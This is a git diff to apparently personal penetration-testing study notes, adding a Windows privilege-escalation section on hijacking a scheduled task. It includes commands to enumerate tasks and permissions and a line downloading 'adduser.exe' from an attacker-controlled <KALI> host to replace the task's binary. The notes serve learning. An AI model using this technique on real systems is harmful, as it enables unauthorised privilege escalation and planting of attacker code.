@@ -1279,7 +1279,20 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     net localgroup administrators
     ```
 - Scheduled Tasks
-- Using Exploits   
+  - if tasks run as NT AUTHORITY\SYSTEM or as an administrative user, could lead to privilege escalation  
+  - diplay all scheduled tasks > \Microsoft\CacheCleanup  
+    start In: C:\Users\steve\Pictures. task to run: C:\Users\steve\Pictures\BackendCacheCleanup.exe  
+    `schtasks /query /fo LIST /v`
+  - check permission for BackendCacheCleanup.exe > Full access  
+    `icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe`
+  - Use our binary adduser.exe to replace the executable file  
+    ```
+    iwr -Uri http://<KALI>/adduser.exe -Outfile BackendCacheCleanup.exe
+    move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
+    move .\BackendCacheCleanup.exe .\Pictures\
+    ```
+- Using Exploits
+- 
 ### 18. Linux privilege escalation
 ### 19. Port redirection and SSH tunneling
 ### 20. Tunneling through deep packet inspectation
@@ -2204,7 +2217,8 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     net user
     net localgroup administrators
     ```
-- 
+- 17.3.1 Scheduled Tasks
+- 17.3.2 Using Exploits
 - dsdd  
 
 ## Penetration testing report 
